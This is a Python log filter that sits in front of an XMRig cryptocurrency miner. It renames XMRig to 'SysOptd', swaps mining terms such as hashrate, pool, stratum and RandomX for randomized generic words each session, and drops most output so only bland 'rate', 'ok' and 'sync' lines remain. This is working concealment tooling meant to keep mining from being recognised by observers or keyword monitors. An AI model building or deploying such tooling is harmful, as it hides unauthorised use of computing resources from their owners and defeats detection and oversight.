#!/usr/bin/env python3
"""
Log filter/formatter — sits between worker stdout and the terminal.
Replaces all mining-related terms, randomizes labels and format each session.
"""

import sys
import re
import random
import time
from datetime import datetime

# ── per-session random identity ──────────────────────────────────────────────
random.seed()  # true random each run

SESSION_LABELS = {
    "net":     random.choice(["link", "conn", "sync", "relay", "pipe"]),
    "cpu":     random.choice(["exec", "core", "task", "proc", "unit"]),
    "miner":   random.choice(["work", "run",  "svc",  "job",  "srv"]),
    "randomx": random.choice(["init", "prep", "load", "boot", "cfg"]),
    "msr":     random.choice(["sys",  "kern", "hw",   "reg",  "mod"]),
    "signal":  random.choice(["evt",  "sig",  "ctrl", "mgr",  "mon"]),
}

# Choose one label for the session to replace "miner", "randomx", etc
WORKER_LABEL = random.choice(["worker", "svc", "proc", "unit", "core"])

# Skip timestamps - simpler format
SHOW_TIMESTAMPS = False

# ── per-session speed unit label ──────────────────────────────────────────────
SPEED_LABELS = ["ops/s", "tps", "rps", "u/s", "w/s", "kops"]
speed_label = random.choice(SPEED_LABELS)

# ── ANSI strip ────────────────────────────────────────────────────────────────
ANSI_ESC = re.compile(r'\x1b\[[0-9;]*m')

def strip_ansi(s):
    return ANSI_ESC.sub('', s)

# ── term replacements (applied after ANSI strip) ──────────────────────────────
TERM_MAP = [
    # HIDE ALL XMRIG BRANDING
    (r'XMRig[/\d.]*', 'SysOptd'),
    (r'xmrig', 'sysoptd'),
    (r'XMRIG', 'SYSOPTD'),
    
    # Mining-specific terminology
    (r'\bminer\b', WORKER_LABEL),
    (r'\bMiner\b', WORKER_LABEL.title()),
    (r'\bmining\b', 'processing'),
    (r'\bMining\b', 'Processing'),
    (r'\bhashrate\b', 'throughput'),
    (r'\bHashrate\b', 'Throughput'),
    (r'\bH/s\b', speed_label),
    (r'\bkH/s\b', 'k' + speed_label if not speed_label.startswith('k') else speed_label),
    (r'\bMH/s\b', 'M' + speed_label if not speed_label.startswith('M') else speed_label),
    
    # Algo/protocol refs
    (r'\brx/0\b', random.choice(["t0", "p0", "v0", "c0", "s0"])),
    (r'\brx/v2\b', "t2"),
    (r'\brx/wow\b', "tw"),
    (r'\brx\b', random.choice(["t", "p", "v", "c"])),
    (r'\bRandomX\b', random.choice(["Runtime", "Engine", "Exec"])),
    (r'\brandomx\b', random.choice(["runtime", "engine", "exec"])),
    
    # Pool/stratum terminology
    (r'\bpool\b', random.choice(["host", "peer", "node"])),
    (r'\bPool\b', random.choice(["Host", "Peer", "Node"])),
    (r'\bstratum\b', "proto"),
    (r'\bStratum\b', "Proto"),
    (r'\bshare\b', random.choice(["unit", "batch", "task"])),
    (r'\bShare\b', random.choice(["Unit", "Batch", "Task"])),
    (r'\baccepted\b', random.choice(["ok", "ack", "accepted"])),
    (r'\bAccepted\b', random.choice(["Ok", "Ack", "Accepted"])),
    (r'\brejected\b', 'failed'),
    (r'\bRejected\b', 'Failed'),
    (r'\bdiff\b', random.choice(["sz", "pr", "wt"])),
    (r'\bdifficulty\b', random.choice(["size", "priority", "weight"])),
    
    # Job/work terminology
    (r'\bnew job\b', random.choice(["refresh", "update", "new task"])),
    (r'\bNew job\b', random.choice(["Refresh", "Update", "New task"])),
    (r'\bjob\b', random.choice(["task", "unit", "work"])),
    (r'\bJob\b', random.choice(["Task", "Unit", "Work"])),
    
    # Dataset/cache
    (r'\bdataset\b', random.choice(["cache", "index", "store"])),
    (r'\bDataset\b', random.choice(["Cache", "Index", "Store"])),
    (r'\bscratchpad\b', random.choice(["workspace", "heap", "buffer"])),
    (r'\bScratchpad\b', random.choice(["Workspace", "Heap", "Buffer"])),
    
    # Memory
    (r'\bhuge pages\b', "large mem"),
    (r'\bHUGE PAGES\b', "LARGE MEM"),
    (r'\b1GB pages\b', "1GB PAGES"),
    (r'\b1GB PAGES\b', "LARGE MEM"),
    (r'\ballocated\b', random.choice(["reserved", "loaded", "mapped"])),
    
    # Thread/process
    (r'\bthreads\b', random.choice(["procs", "units", "workers"])),
    (r'\bThread\b', random.choice(["Proc", "Unit", "Worker"])),
    
    # Other terms
    (r'\bheight\b', "idx"),
    (r'\bJIT\b', "AOT"),
    (r'\bMSR\b', "reg"),
    (r'\bmsr\b', "reg"),
    (r'\bmod\b', "reg"),
    (r'\bkernel module\b', "reg module"),
    (r'\bDONATE\b', random.choice(["OVERHEAD", "RESERVE", "MARGIN"])),
    (r'\bdonate\b', random.choice(["overhead", "reserve", "margin"])),
    (r'\blibuv/[\d.]+\b', 'libuv'),
    (r'\bOpenSSL/[\d.]+\b', 'OpenSSL'),
    (r'\bhwloc/[\d.]+\b', 'hwloc'),
    (r'\bgcc/[\d.]+\b', 'gcc'),
]

# ── label replacer ────────────────────────────────────────────────────────────
LABEL_PAT = re.compile(r'\b(' + '|'.join(re.escape(k) for k in SESSION_LABELS) + r')\b')

def replace_labels(s):
    return LABEL_PAT.sub(lambda m: SESSION_LABELS.get(m.group(0), m.group(0)), s)

# ── main line processor ───────────────────────────────────────────────────────
def process_line(raw):
    line = strip_ansi(raw).rstrip('\n').rstrip()
    if not line:
        return None

    # Apply term replacements
    for pat, rep in TERM_MAP:
        line = re.sub(pat, rep, line, flags=re.IGNORECASE)

    # Replace log labels
    line = replace_labels(line)

    # Strip original timestamp: [16:50:55.96] or [6027.741]
    line = re.sub(r'^\[\s*[\d:.]+\]\s*', '', line)

    # SKIP verbose startup banner lines (ABOUT, LIBS, CPU, MEMORY, etc)
    if re.match(r'^\*\s+(ABOUT|LIBS|CPU|MEMORY|ASSEMBLY|COMMANDS|large mem|1GB|DONATE)', line, re.IGNORECASE):
        return  # skip completely

    # Strip leading " * " info lines (startup banner) - compact them
    if re.match(r'^\*\s+', line):
        return  # skip startup banners
    
    # SKIP "use argon2 implementation" lines
    if 'argon2' in line.lower() or 'implementation' in line.lower():
        return
    
    # SKIP "reg kernel module" warnings
    if 'reg' in line.lower() and ('kernel' in line.lower() or 'mod' in line.lower() or 'FAILED' in line):
        return
    
    # SKIP "load cache" / "reserved" / "cache OK" verbose init lines
    if any(x in line.lower() for x in ['load cache', 'reserved', 'cache ok', 'workspace', 'memory ', 'large mem']):
        return
    
    # SKIP "use profile" lines
    if 'use profile' in line.lower() or 'profile rx' in line.lower():
        return

    # Speed line: reformat compactly
    # e.g. "miner speed 10s/60s/15m 942.7 8259.7 n/a ops/s max 947.2 ops/s"
    spd = re.search(r'speed\s+\S+\s+([\d.]+|n/a)\s+([\d.]+|n/a)\s+([\d.]+|n/a)', line, re.IGNORECASE)
    if spd:
        v10, v60, v15 = spd.group(1), spd.group(2), spd.group(3)
        # Only show if we have real values
        if v10 != 'n/a' or v60 != 'n/a':
            v10_val = float(v10) if v10 != 'n/a' else 0
            v60_val = float(v60) if v60 != 'n/a' else 0
            # Convert to simpler format (no decimals for larger numbers)
            v10_str = f"{v10_val:.0f}" if v10_val > 100 else v10
            v60_str = f"{v60_val:.0f}" if v60_val > 100 else v60
            print(f"rate {v60_str} {speed_label}", flush=True)
        return

    # Simplify "accepted" lines (catch all variations: "accepted", "ok", "ack", etc)
    if re.search(r'\b(accepted|ack|ok)\b', line, re.IGNORECASE):
        # Extract share count if present: "accepted (7/0)"
        m = re.search(r'\((\d+)/\d+\)', line)
        if m:
            count = m.group(1)
            print(f"ok #{count}", flush=True)
        else:
            print(f"ok", flush=True)
        return

    # Simplify "new task" / "refresh" lines
    if any(x in line.lower() for x in ['refresh', 'new task', 'update', 'tick']):
        print(f"sync", flush=True)
        return

    # Compact "OK units" / "OK procs" lines
    if re.search(r'\bok\s+(units?|procs?|workers?)', line, re.IGNORECASE):
        m = re.search(r'(\d+)/(\d+)', line)
        if m:
            print(f"init {m.group(1)}/{m.group(2)}", flush=True)
        else:
            print(f"init ok", flush=True)
        return

    # SKIP everything else that's too verbose
    # Only show: rate, ok, sync, init
    # Skip all other worker noise
    return

# ── entry point ───────────────────────────────────────────────────────────────
if __name__ == '__main__':
    try:
        for raw in sys.stdin:
            process_line(raw)
    except (BrokenPipeError, KeyboardInterrupt):
        pass
